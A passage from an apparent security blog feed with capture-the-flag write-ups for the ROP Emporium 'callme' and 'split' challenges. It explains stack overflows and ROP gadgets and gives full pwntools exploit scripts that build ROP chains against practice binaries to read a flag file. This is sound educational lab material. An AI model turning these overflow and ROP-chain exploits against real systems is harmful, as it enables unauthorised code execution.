32 bit architecture version. As the callme functions will be calling parameters off the stack, these can be called last after we have placed the parameters into the correct registers. First we need to call our gadget which will pop the 3 following parameters off the stack and into the correct registers. Then finally, we call the callme function and we should get the flag.</p> <p> </p> <p>Instead of using python2 here manually, we will use the template from previous challenges and create a working python3 script using pwntools to solve the challenge. This is provided below the 32 bit script.</p> <p> </p> <h3 id="the-32-bit-python-script">The 32 bit python script</h3> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">##### SETUP &amp; RUN #####
+</span>
+<span class="c1">#Define the executable
+</span><span class="n">exe</span> <span class="o">=</span> <span class="s">'./callme32'</span>
+
+<span class="c1"># This will automatically get context arch, bits, os etc
+</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="c1"># verbose logging so we can see what is being sent
+</span><span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'info'</span>
+
+<span class="c1">#delete corefiles after crash occurs
+</span><span class="n">context</span><span class="p">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="c1"># run the elf
+</span><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
+
+<span class="c1">##### FIND USEFUL ADDRESSES #####
+</span>
+<span class="c1"># Locate the functions/strings we need - either do this manually or using pwntools
+</span>
+<span class="c1"># Address needed to put parameters in registers
+</span><span class="n">pop</span> <span class="o">=</span> <span class="mh">0x080487f9</span>
+<span class="n">callmeone</span> <span class="o">=</span> <span class="mh">0x80484f0</span>
+<span class="n">callmetwo</span> <span class="o">=</span> <span class="mh">0x8048550</span>
+<span class="n">callmethree</span> <span class="o">=</span> <span class="mh">0x80484e0</span>
+<span class="n">param1</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span>
+<span class="n">param2</span> <span class="o">=</span> <span class="mh">0xcafebabe</span>
+<span class="n">param3</span> <span class="o">=</span> <span class="mh">0xd00df00d</span>
+
+
+<span class="c1">##### FIND CRASH OVERWRITE RETURN ADDRESS OFFSET #####
+</span>
+<span class="c1"># We will send a 'cyclic' pattern which overwrites the return address on the stack
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+
+<span class="c1"># Send cyclic pattern to crash it
+</span><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Wait for the process to crash
+</span><span class="n">io</span><span class="p">.</span><span class="n">wait</span><span class="p">()</span>
+
+<span class="c1"># Open up the corefile created after crash
+</span><span class="n">core</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">corefile</span>
+
+<span class="c1"># Print out the address of EIP at the time of crashing
+</span><span class="n">eip_value</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">eip</span>
+<span class="n">eip_offset</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="n">eip_value</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">'located EIP offset at {a}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">eip_offset</span><span class="p">))</span>
+
+<span class="c1">##### CRAFTING PAYLOAD #####
+</span>
+<span class="c1"># fit works below by making it aaa + addr1 + addr2 + addr3 and converts hex to ascii where appropriate
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">fit</span><span class="p">({</span><span class="n">eip_offset</span><span class="p">:</span> <span class="p">[</span><span class="n">callmeone</span><span class="p">,</span> <span class="n">pop</span><span class="p">,</span> <span class="n">param1</span><span class="p">,</span> <span class="n">param2</span><span class="p">,</span> <span class="n">param3</span><span class="p">,</span> <span class="n">callmetwo</span><span class="p">,</span> <span class="n">pop</span><span class="p">,</span> <span class="n">param1</span><span class="p">,</span> <span class="n">param2</span><span class="p">,</span> <span class="n">param3</span><span class="p">,</span> <span class="n">callmethree</span><span class="p">,</span> <span class="n">pop</span><span class="p">,</span> <span class="n">param1</span><span class="p">,</span> <span class="n">param2</span><span class="p">,</span> <span class="n">param3</span><span class="p">]})</span>
+
+<span class="c1"># alternative way - p32 converts 0x90 to \x90
+# payload = b""
+# payload += b'A' * eip_offset
+# payload += p32(callmeone)
+# payload += p32(pop)
+# payload += p32(param1)
+# payload += p32(param2)
+# payload += p32(param3)
+# payload += p32(callmetwo)
+# payload += p32(pop)
+# payload += p32(param1)
+# payload += p32(param2)
+# payload += p32(param3)
+# payload += p32(callmethree)
+# payload += p32(pop)
+# payload += p32(param1)
+# payload += p32(param2)
+# payload += p32(param3)
+# print(payload)
+</span>
+
+<span class="c1">##### SEND PAYLOAD AND GET FLAG #####
+</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Thank you!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+
+<span class="c1">#Get our flag!
+</span><span class="n">flag</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">success</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+
+<span class="c1">##### END #####
+</span></code></pre></div></div> <p> </p> <h3 id="the-64-bit-python-script">The 64 bit python script</h3> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">##### SETUP &amp; RUN #####
+</span>
+<span class="c1">#Define the executable
+</span><span class="n">exe</span> <span class="o">=</span> <span class="s">'./callme'</span>
+
+<span class="c1"># This will automatically get context arch, bits, os etc
+</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="c1"># verbose logging so we can see what is being sent
+</span><span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'info'</span>
+
+<span class="c1">#delete corefiles after crash occurs
+</span><span class="n">context</span><span class="p">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="c1"># run the elf
+</span><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
+
+<span class="c1">##### FIND USEFUL ADDRESSES #####
+</span>
+<span class="c1"># Locate the functions/strings we need - either do this manually or using pwntools
+</span>
+<span class="c1"># rop = ROP(elf)
+# register_pop_gadget = rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"])[0]
+</span><span class="n">pop_gadget</span> <span class="o">=</span> <span class="mh">0x000000000040093c</span>
+<span class="n">param1</span> <span class="o">=</span> <span class="mh">0xdeadbeefdeadbeef</span>
+<span class="n">param2</span> <span class="o">=</span> <span class="mh">0xcafebabecafebabe</span>
+<span class="n">param3</span> <span class="o">=</span> <span class="mh">0xd00df00dd00df00d</span>
+<span class="n">callmeone</span> <span class="o">=</span> <span class="mh">0x0000000000400720</span>
+<span class="n">callmetwo</span> <span class="o">=</span> <span class="mh">0x0000000000400740</span>
+<span class="n">callmethree</span> <span class="o">=</span> <span class="mh">0x00000000004006f0</span>
+
+
+<span class="c1"># Print out the target address
+</span><span class="n">info</span><span class="p">(</span><span class="s">"%#x pop rdi; ret;"</span><span class="p">,</span> <span class="n">pop_gadget</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x param1"</span><span class="p">,</span> <span class="n">param1</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x param2"</span><span class="p">,</span> <span class="n">param2</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x param3"</span><span class="p">,</span> <span class="n">param3</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x callmeone"</span><span class="p">,</span> <span class="n">callmeone</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x callmetwo"</span><span class="p">,</span> <span class="n">callmetwo</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x callmethree"</span><span class="p">,</span> <span class="n">callmethree</span><span class="p">)</span>
+
+
+<span class="c1">##### FIND CRASH OVERWRITE RETURN ADDRESS OFFSET #####
+</span>
+<span class="c1"># We will send a 'cyclic' pattern which overwrites the return address on the stack
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+
+<span class="c1"># Send cyclic pattern to crash it
+</span><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Wait for the process to crash
+</span><span class="n">io</span><span class="p">.</span><span class="n">wait</span><span class="p">()</span>
+
+<span class="c1"># Open up the corefile created after crash
+</span><span class="n">core</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">corefile</span>
+
+<span class="n">stack</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">rsp</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x stack"</span><span class="p">,</span> <span class="n">stack</span><span class="p">)</span>
+
+<span class="c1"># Read four bytes from RSP, which will be some of our cyclic data.
+# With this snippet of the pattern, we know the exact offset from
+# the beginning of our controlled data to the return address.
+</span><span class="n">pattern</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="n">stack</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%r pattern (offset: %r)"</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">offset</span><span class="p">)</span>
+
+<span class="c1">##### CRAFTING PAYLOAD #####
+</span>
+<span class="c1"># Note that we have to call pop_rdi gadget here
+</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="n">offset</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_gadget</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">param1</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">param2</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">param3</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">callmeone</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_gadget</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">param1</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">param2</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">param3</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">callmetwo</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_gadget</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">param1</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">param2</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">param3</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">callmethree</span><span class="p">)</span>
+
+<span class="c1">##### SEND PAYLOAD AND GET FLAG #####
+</span>
+
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Thank you!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="c1">#Get our flag!
+</span><span class="n">flag</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">success</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+
+<span class="c1">##### END #####
+</span></code></pre></div></div>]]></content><author><name></name></author><category term="ROP"/><category term="GDB"/><category term="pwndbg"/><category term="pwntools"/><category term="formatting"/><category term="links"/><category term="binexp"/><summary type="html"><![CDATA[ROP Emporium challenge 3 - callme]]></summary></entry><entry><title type="html">ROP Emporium - split</title><link href="https://parroquet.github.io/blog/2022/split/" rel="alternate" type="text/html" title="ROP Emporium - split"/><published>2022-12-28T14:29:00+00:00</published><updated>2022-12-28T14:29:00+00:00</updated><id>https://parroquet.github.io/blog/2022/split</id><content type="html" xml:base="https://parroquet.github.io/blog/2022/split/"><![CDATA[<h2 id="basic-setup">Basic setup:</h2> <ul> <li>ROPEmporium x86 &amp; x86_64 binaries</li> <li>Ubuntu lab machine</li> <li>GDB &amp; pwndbg</li> <li>pwntools</li> </ul> <p> </p> <h3 id="link-to-challenge">Link to challenge</h3> <p><a href="https://ropemporium.com/challenge/split.html">https://ropemporium.com/challenge/split.html</a></p> <p> </p> <h3 id="the-32-bit-solve">The 32 bit solve</h3> <p>This challenge is a bit more complicated where instead of the command calling system and executing /bin/cat flag.txt in the same function, these are split up and ROP gadgets are needed.</p> <p> </p> <p><img src="../../../assets/img/split_img/1checksec.png" alt="checksec" width="750"/></p> <p>Similar to the previous challenge, we can see that DEP/NX is enabled meaing that we cannot execute shellcode on the stack. We also see that partial RELRO is enabled which means that the the Global Offset Table (GOT) is read only. This means that we cannot overwrite any GOT entries.</p> <p> </p> <p><img src="../../../assets/img/split_img/2rabinstrings.png" alt="rabinstrings" width="750"/></p> <p>Using the command provided by radare2, <strong>rabin2 -z split32</strong>, we can see the strings in the binary. /bin/cat flag.txt is seen again as well as the /bin/ls command.</p> <p> </p> <p><img src="../../../assets/img/split_img/3rabinfuncs.png" alt="rabinfuncs" width="750"/></p> <p>Using -i we can see the imported functions. System is seen again which we will use to exploit this binary.</p> <p> </p> <p><img src="../../../assets/img/split_img/4ghidramain.png" alt="ghidramain" width="750"/> <img src="../../../assets/img/split_img/5ghidrapwnme.png" alt="ghidrapwnme" width="750"/> <img src="../../../assets/img/split_img/6ghidrausefulfunc.png" alt="ghidrausefulfunc" width="750"/></p> <p>Using Ghidra we can see the main, pwnme and usefulFunction functions disassembled. This explains a lot about functionality but most importantly, it shows the binary trying to fit 0x60 worth of input into a 0x20 buffer. This means that we can overflow the buffer and overwrite the return address.</p> <p> </p> <p><img src="../../../assets/img/split_img/7pwndbgsystem.png" alt="pwndbgsystem" width="750"/></p> <p>We can now start to develop our exploit. For this we will need the address of the <strong>system</strong> function. We can see this above as 0x080483e0. We can use this address or we can also use the address seen on the left for the entire line <strong>call system</strong> - 0x0804861a. By using <strong>system</strong> we will need to provide a 4 byte junk return address between system and the address of /bin/cat flag.txt to impersonate functionality of the <strong>call</strong> instruction and so the binary knows what to do after executing system. We will use the <strong>call system</strong> address for simplicity.</p> <p> </p> <p><img src="../../../assets/img/split_img/8breakmain.png" alt="breakmain" width="750"/></p> <p>Next we need to grab the address of the string set which contains “/bin/cat flag.txt”. To do this within pwndbg, we need to first run the program with a breakpoint set.</p> <p> </p> <p><img src="../../../assets/img/split_img/9addrbincat.png" alt="addrbincat" width="750"/></p> <p>We can then search for the string which provides us with the address.</p> <p> </p> <p><img src="../../../assets/img/split_img/10offsetsearch.png" alt="offsetsearch" width="750"/> <img src="../../../assets/img/split_img/11offset.png" alt="offset" width="750"/></p> <p>The last thing to do before creating our payload is to find the offset for the buffer overflow. The command <strong>cyclic 100</strong> is used again finding the EIP value and finding the offset of 44 by using <strong>cyclic -l laaa</strong>.</p> <p> </p> <p><img src="../../../assets/img/split_img/12genpayload.png" alt="genpayload" width="750"/></p> <p>Finally, we can use python2 to create our payload and piping it to the binary to get the flag.</p> <p> </p> <h3 id="the-64-bit-solve">The 64 bit solve</h3> <p>The 64 bit architecture handles arguments for system calls differently to 32 bit so our exploit will look slightly different.</p> <p> </p> <p>32 bit: <img src="../../../assets/img/split_img/1332bitarguments.png" alt="1332bitarguments" width="750"/></p> <p>32 bit architecture can simply just take arguments from the stack and this is why a ROP chain of 2 links was used in the 32 bit solve. Link 1 for the system call and link 2 for the address of the string.</p> <p> </p> <p>64bit: <img src="../../../assets/img/split_img/1464bitarguments.png" alt="1364bitarguments" width="750"/></p> <p>However, 64 bit architecture requires the arguments to be passed in the registers seen above. This means that we need to use a ROP chain of 3 links as we need to pass an instruction which populates the RDI register before calling system. A commonly used gadget <strong>pop rdi; ret</strong> can be used to populate the RDI register as it will pop the value off the stack and store it in the RDI register.</p> <p> </p> <p><img src="../../../assets/img/split_img/15cyclic.png" alt="cyclic" width="750"/></p> <p>Firstly, we find the offset of the buffer overflow using the cyclic command as seen before.</p> <p> </p> <p><img src="../../../assets/img/split_img/16offset.png" alt="offset" width="750"/></p> <p>By taking the first 8 bytes of the RSP register, we can see that the offset is 40.</p> <p> </p> <p><img src="../../../assets/img/split_img/17systemaddr.png" alt="systemaddr" width="750"/></p> <p>Again we take the address for system on the left and write it down for later use.</p> <p> </p> <p><img src="../../../assets/img/split_img/18bincataddr.png" alt="bincataddr" width="750"/></p> <p>We need then to find the 64 bit address of the “/bin/cat flag.txt” string which we can do by searching within pwndbg using the same command as before.</p> <p> </p> <p><img src="../../../assets/img/split_img/19ropgadget.png" alt="ropgadget" width="750"/></p> <p>Lastly, we need to find our rop gadget which can populate the RDI register with the “/bin/cat flag.txt” string for our system call. We can use the command <strong>ROPgadget –binary split64 –ropchain</strong> to list all the gadgets available and by using a simple grep, we find our <strong>pop rdi ; ret</strong> gadget address which we can note down.</p> <p>ROPgadget was installed using <strong>sudo apt install python3-ropgadget</strong>.</p> <p> </p> <p><img src="../../../assets/img/split_img/20order.png" alt="order" width="750"/></p> <p>Before we build the payload, we need to understand the order of the ROP chain. The order is as follows:</p> <ul> <li>The first 40 bytes of the payload is the offset of the buffer overflow.</li> <li>The next few bytes is the address of the <strong>pop rdi ; ret</strong> gadget.</li> <li>The next few bytes are the address of the “/bin/cat flag.txt” string.</li> <li>Lastly is the address of the <strong>system</strong> function.</li> </ul> <p>This is the order as the <strong>pop rdi ; ret</strong> gadget first needs to pop the address of the “/bin/cat flag.txt” string off the stack and store it in the RDI register. The string value comes next as this is what is popped. Lastly, the <strong>system</strong> function is appended as it will be called using the RDI register as the argument.</p> <p> </p> <p><img src="../../../assets/img/split_img/21payloadcreated.png" alt="payloadcreated" width="750"/></p> <p>A final payload can then be created using python2 in little endian and by padding with null bytes to fit the 64 bit architecture. Piping this to the binary will give us the flag.</p> <p> </p> <h3 id="scripts">Scripts</h3> <p>Provided are the two scripts used to solve this challenge. These are inspired by CryptoCat’s youtube tutorial and edited for my own understanding. Furthermore, these scripts will be used as a template for the remaining ROPEmporium challenges.</p> <p> </p> <h4 id="32-bit">32 bit</h4> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">##### SETUP &amp; RUN #####
+</span>
+<span class="c1">#Define the executable
+</span><span class="n">exe</span> <span class="o">=</span> <span class="s">'./split32'</span>
+
+<span class="c1"># This will automatically get context arch, bits, os etc
+</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="c1"># verbose logging so we can see what is being sent
+</span><span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'info'</span>
+
+<span class="c1">#delete corefiles after crash occurs
+</span><span class="n">context</span><span class="p">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="c1"># run the elf
+</span><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
+
+<span class="c1">##### FIND USEFUL ADDRESSES #####
+</span>
+<span class="c1"># Locate the functions/strings we need - either do this manually or using pwntools
+</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+<span class="n">bincat_addr</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/cat'</span><span class="p">))</span>
+<span class="n">junk_addr</span> <span class="o">=</span> <span class="mh">0x61616161</span>       <span class="c1"># junk address needed to impersonate as call system
+</span>
+<span class="c1"># can do it this way also - using "call system" instead of "system"
+#bincat_addr = 0x0804a030     &lt;- bincat same as above
+#callsystem_addr = 0x0804861a &lt;- call system addr different to above
+</span>
+
+<span class="c1"># Print out the target address
+</span><span class="n">info</span><span class="p">(</span><span class="s">"%#x system"</span><span class="p">,</span> <span class="n">system_addr</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x /bin/cat"</span><span class="p">,</span> <span class="n">bincat_addr</span><span class="p">)</span>
+
+
+<span class="c1">##### FIND CRASH OVERWRITE RETURN ADDRESS OFFSET #####
+</span>
+<span class="c1"># We will send a 'cyclic' pattern which overwrites the return address on the stack
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+
+<span class="c1"># Send cyclic pattern to crash it
+</span><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Wait for the process to crash
+</span><span class="n">io</span><span class="p">.</span><span class="n">wait</span><span class="p">()</span>
+
+<span class="c1"># Open up the corefile created after crash
+</span><span class="n">core</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">corefile</span>
+
+<span class="c1"># Print out the address of EIP at the time of crashing
+</span><span class="n">eip_value</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">eip</span>
+<span class="n">eip_offset</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="n">eip_value</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">'located EIP offset at {a}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">eip_offset</span><span class="p">))</span>
+
+<span class="c1">##### CRAFTING PAYLOAD #####
+</span>
+<span class="c1"># Craft a new payload which puts system('/bin/cat flag.txt') at correct offset
+# fit works below by making it aaa + addr1 + addr2 + addr3 and converts hex to ascii where appropriate
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">fit</span><span class="p">({</span><span class="n">eip_offset</span><span class="p">:</span> <span class="p">[</span><span class="n">system_addr</span><span class="p">,</span> <span class="n">junk_addr</span><span class="p">,</span> <span class="n">bincat_addr</span><span class="p">]})</span>
+
+<span class="c1"># alternative way - p32 converts 0x90 to \x90
+# payload = b""
+# payload += b'A' * eip_offset
+# payload += p32(system_addr)
+# payload += p32(junk_addr)
+# payload += p32(bincat_addr)
+# print(payload)
+</span>
+
+<span class="c1">##### SEND PAYLOAD AND GET FLAG #####
+</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Thank you!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+
+<span class="c1">#Get our flag!
+</span><span class="n">flag</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">success</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+
+<span class="c1">##### END #####
+</span></code></pre></div></div> <h4 id="64-bit">64 bit</h4> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">##### SETUP &amp; RUN #####
+</span>
+<span class="c1">#Define the executable
+</span><span class="n">exe</span> <span class="o">=</span> <span class="s">'./split'</span>
+
+<span class="c1"># This will automatically get context arch, bits, os etc
+</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="c1"># verbose logging so we can see what is being sent
+</span><span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'info'</span>
+
+<span class="c1">#delete corefiles after crash occurs
+</span><span class="n">context</span><span class="p">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="c1"># run the elf
+</span><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
+
+<span class="c1">##### FIND USEFUL ADDRESSES #####
+</span>
+<span class="c1"># Locate the functions/strings we need - either do this manually or using pwntools
+</span>
+<span class="n">pop_rdi_gadget</span> <span class="o">=</span> <span class="mh">0x00000000004007c3</span>
+<span class="n">bincat_addr</span> <span class="o">=</span> <span class="mh">0x0000000000601060</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0x000000000040074b</span>
+
+<span class="c1"># can do it this way also - using "call system" instead of "system"
+#bincat_addr = 0x0000000000601060     &lt;- bincat same as above
+#callsystem_addr = 0x000000000040074b &lt;- call system addr different to above
+#ropgadget = 0x00000000004007c3 &lt;- needed for 64 bit architecture as arguments for system 
+# are called from rdi so we need to pop from the stack and store into rdi so "pop rdi ; ret" gadget is used
+</span>
+
+<span class="c1"># Print out the target address
+</span><span class="n">info</span><span class="p">(</span><span class="s">"%#x pop rdi; ret;"</span><span class="p">,</span> <span class="n">pop_rdi_gadget</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x /bin/cat"</span><span class="p">,</span> <span class="n">bincat_addr</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x system"</span><span class="p">,</span> <span class="n">system_addr</span><span class="p">)</span>
+
+
+<span class="c1">##### FIND CRASH OVERWRITE RETURN ADDRESS OFFSET #####
+</span>
+<span class="c1"># We will send a 'cyclic' pattern which overwrites the return address on the stack
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+
+<span class="c1"># Send cyclic pattern to crash it
+</span><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Wait for the process to crash
+</span><span class="n">io</span><span class="p">.</span><span class="n">wait</span><span class="p">()</span>
+
+<span class="c1"># Open up the corefile created after crash
+</span><span class="n">core</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">corefile</span>
+
+<span class="n">stack</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">rsp</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x stack"</span><span class="p">,</span> <span class="n">stack</span><span class="p">)</span>
+
+<span class="c1"># Read four bytes from RSP, which will be some of our cyclic data.
+# With this snippet of the pattern, we know the exact offset from
+# the beginning of our controlled data to the return address.
+</span><span class="n">pattern</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="n">stack</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+<span class="c1"># read first 4 
+</span><span class="n">offset</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
